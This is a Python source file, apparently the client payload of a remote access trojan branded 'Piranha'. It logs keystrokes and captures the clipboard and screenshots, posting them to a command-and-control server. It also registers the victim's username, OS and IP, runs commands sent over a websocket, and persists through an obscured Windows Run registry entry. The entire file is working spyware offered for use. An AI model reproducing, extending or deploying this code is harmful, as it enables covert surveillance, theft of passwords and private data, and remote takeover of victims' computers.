from time import sleep
import time
import requests as req
import os
import json
from keylogger import keylogger
from threading import Timer
import sys
from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, QueryValueEx
from Commands import commands
import websockets as ws
import asyncio

'''
                • ⠀⠀▓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀•⠀⠀░⠀⠀⠀⠀⠀•⠀⠀  ◾
         ▄        ⠀⠀⢠⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ░
  ▄               ⠀⠀⠀⢻⣿⣿⡿⠛⣉⣠⣤⣤⣤⣤⣀⠀⠀⠀•⠀⠀⠀⠀⠀  ▓
               ⠀⠀⠀▄⠀⠀⠀⠟⢁⣴⣾⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀░⠀          
      •    ░  ⣤⡀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣧⠀⠀⠀⠀⠀⠀    •   •
     ▓        ⢻⣿⣆⠀⠀⠀⢀⣾⣿⣿⡟⢀⣿⣿⣿⣿⣦⣀⣀⣀⣹⣿⣧⣀⠀⠀⠀⠀      ◾
              ⢸⣿⣿⡆⠀⢠⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⡄⠀◾      █
 •         •  ⢸⣿⠋⣠⣶⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⡀⣴⣿⠹⣷⠀⠀ •
     ▄        ⢸⣿⠀⠿⠿⢿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⡿⠋⣠⣴⡙⣿⠈⠿⠀⠘⠀⠀  •
          ▓   ⢸⣿⣷⣦⠀⠈⠻⣿⣿⢿⣾⣿⣿⣿⣿⠋⢀⡈⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠈      ▓
              ⢸⣿⡿⠃⠀⠀⠀⢀⣠⣴⣿⡿⣿⣿⣿⣦⡈⠻⣠⣴⢀⡴⠀⣀⠀⣰⠀⠀             
     •        ⢸⠟⠁⠀⠠⠴⣾⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣦⣈⠁⠾⢇⡼⠿⠞⠛⠀⠀  ░
 ◾        •   ⠀•⠀⠀⠀⠀⠀⠙⠿⣿⠇⠈⠻⠿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣶⠖⠀⠀⠀    ◾ 
            ⠀⠀⠀⠀⠀⠀⠀⠀▄⠀⠀⠉⠀•⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀        ⠈ 
 ▀██▀▀█▄   ██          •    ░        •  ▀██   ⠈        ◾
  ██   ██ ▄▄▄  ▄▄▄ ▄▄   ▄▄▄▄   ▄▄ ▄▄▄    ██ ▄▄    ▄▄▄•
  ██▄▄▄█▀  ██   ██▀ ▀▀ ▀▀ ▄██   ██  ██   ██▀ ██  ▀▀ ▄██
  ██       ██   ██     ▄█▀ ██   ██  ██   ██  ██  ▄█▀ ██
 ▄██▄     ▄██▄ ▄██▄    ▀█▄▄▀█▀ ▄██▄ ██▄ ▄██▄ ██▄ ▀█▄▄▀█▀
                                              by uzairrj
'''
######################### Configuration ############################
BASE_URL = "http://127.0.0.1:8000"
UUID = "312314143312"
HEART_BEAT = 30
INTERVAL = 60
WEBSOCKET_BASE_URL = "ws://127.0.0.1:8000/ws/"
####################################################################
# Dont touch below code, if you dont know what you are doing!!
####################################################################

def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, '2j3dj2j4n2jjndksa3ns94n2md23nrss', 0, REG_SZ,
               new_file_path)

def checkStartup():
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal,0, KEY_ALL_ACCESS)
        value = QueryValueEx(key, "2j3dj2j4n2jjndksa3ns94n2md23nrss")
        return value != None
    except FileNotFoundError:
        return False


def contactServer():
    try:
        res = req.get(BASE_URL)
    except req.exceptions.ConnectionError:
        return False
    if res.status_code == req.codes.no_content:
        return True
    return False

def registerServer():
    try:
        ip = req.get('https://api.ipify.org').content.decode('utf8')
    except req.exceptions.ConnectionError:
        ip = None

    userName = os.getlogin()
    osName = os.name
    try:
        res = req.post(BASE_URL+"/connect", data=json.dumps({"UUID":UUID, "name":userName, "OS":osName,"IP":ip}))
    except req.exceptions.ConnectionError:
        return False

    if res.status_code == req.codes.created or res.status_code == req.codes.no_content:
        return True
    else:
        return False

def keyboardCallback(key, logs):
    logs["data"] += key

def sendData(logs, logger):
    Timer(INTERVAL, lambda: sendData(logs, logger)).start() #restart the timer
    try:
        logs["data"] += "\n-------------Clip Board-------------\n"
        logs["data"] += logger.clipboard()
        logs["img"] = str(logger.screenShot().decode("utf-8"))
        res = req.post(BASE_URL+"/keylogs", json.dumps(logs))
        if res.status_code == req.codes.ok:
            logs["data"] = ""
            logs["timeStamp"] = time.time()
            logs["img"] = None
    except req.exceptions.ConnectionError:
        return

async def handleCommands():
    commandsHandler = commands.Commands()
    handler = await ws.connect(WEBSOCKET_BASE_URL+"payload/"+UUID+"/")
    while True:
        data = await handler.recv()
        data = json.loads(data)
        id = data["id"]
        cmd = data["command"]
        arg = data["arg"]
        output = await commandsHandler.run(cmd, arg)
        res = json.dumps({"id":id, "output":output, "type":"payload"})
        await handler.send(res)
        

if __name__ == "__main__":
    logs = {
            "timeStamp":None,
            "data":"", 
            "UUID":UUID,
            "img":None
            }

    logger = keylogger.Keylogger( lambda key: keyboardCallback(key,logs) )
    timer = Timer(INTERVAL, lambda: sendData(logs,logger))
    
    logs["timeStamp"] = time.time()
    logger.run()
    timer.start()

    while(not contactServer()):
        sleep(HEART_BEAT)

    if not registerServer():
        exit()

    asyncio.run(handleCommands())
    
    if(not checkStartup()):
        addStartup()
    
    